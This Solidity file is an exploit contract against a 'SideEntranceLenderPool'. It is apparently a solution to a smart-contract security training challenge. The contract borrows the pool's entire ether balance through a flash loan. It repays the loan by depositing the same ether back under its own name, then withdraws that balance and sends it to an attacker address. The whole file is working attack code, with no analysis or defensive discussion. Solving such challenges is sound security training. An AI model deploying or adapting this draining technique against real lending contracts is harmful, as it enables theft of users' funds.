// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/// @title Attacking SideEntranceLenderPool contract
/// @author kaliberpoziomka
/// @notice This contract attacks the pool to get all funds
/// @dev Explain to a developer any extra details

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;

    ISideEntranceLenderPool pool;
    uint256 amount;

    constructor (address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function attack(address _attacker) public {
        amount = address(pool).balance;

        pool.flashLoan(amount);

        pool.withdraw();
        // safer way of sending ether than low-level call()
        payable(_attacker).sendValue(amount);

    }

    function execute() external payable {
        // amount = msg.value;
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}